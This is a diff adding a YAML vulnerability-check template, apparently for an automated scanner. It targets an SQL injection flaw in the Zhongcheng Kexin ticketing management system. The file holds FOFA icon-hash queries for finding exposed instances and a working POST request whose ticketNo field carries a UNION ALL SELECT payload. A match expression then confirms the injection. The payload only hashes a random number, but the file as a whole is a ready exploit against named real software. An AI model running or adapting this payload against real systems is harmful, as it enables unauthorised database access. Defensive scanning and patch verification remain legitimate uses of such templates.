@@ -1,0 +1,20 @@
+id: poc-yaml-zckx-returnticketplance-sqli
+info:
+  name: 中成科信票务管理系统 ReturnTicketPlance SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 中城科信票务管理平台
+  fofa: icon_hash="1632964065" || icon_hash="-2142050529"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /SystemManager/TicketSystem/ReturnTicketPlance.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Method=GetCheckInDetail&ticketNo='+UNION+ALL+SELECT+NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL,NULL--+BEsy
+  expression: status_code == 200 && contains(body,"\"GATE_NAME\":") && contains(body,"0x"
+    + t2) && !contains(body,"<")
+transport: http
